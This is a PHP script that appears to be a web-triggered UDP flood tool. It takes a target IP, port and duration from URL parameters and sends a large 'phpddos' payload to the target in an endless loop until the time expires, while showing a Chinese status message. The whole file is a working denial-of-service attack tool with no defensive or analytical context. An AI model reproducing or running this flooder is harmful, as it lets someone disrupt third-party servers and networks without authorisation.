<?php
$packets = 0;
$ip = $_GET['ip'];
$port = $_GET['port'];
set_time_limit(0);
ignore_user_abort(FALSE);
$exec_time = $_GET['time'];
$time = time();
print '状态 : 正常运行中…..<br>';
$max_time = $time+$exec_time;
for($i=0;$i<65535;$i++){
$out .= 'phpddos';
}
while(1){
$packets++;
if(time() > $max_time){
break;
}
$fp = fsockopen("udp://$ip", $port, $errno, $errstr, 5);
if($fp){
fwrite($fp, $out);
fclose($fp);
}
}
?>
